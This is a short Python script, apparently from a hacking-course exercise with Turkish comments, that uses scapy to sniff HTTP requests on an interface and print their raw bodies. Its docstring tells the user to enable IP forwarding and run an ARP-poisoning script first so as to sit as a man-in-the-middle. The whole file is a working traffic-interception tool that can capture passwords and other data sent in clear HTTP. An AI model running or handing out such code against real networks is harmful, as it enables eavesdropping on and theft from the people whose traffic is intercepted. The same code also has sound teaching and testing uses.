"""
NOT: Before start write "echo 1 > /proc/sys/net/ipv4/ip_forward" on the terminal
Next, run arp_poison.py for being MITM then execute my_packet_listener.
"""

import scapy.all as scapy
from scapy_http import http


def listen_packets(interface):
    scapy.sniff(iface=interface, store=False, prn=analyse_packets)
    # prn = callback function - paketler geldikçe bana oaket şeklinde input alıp yolluyor


def analyse_packets(packet):
    # packet.show()
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)


listen_packets("eth0")
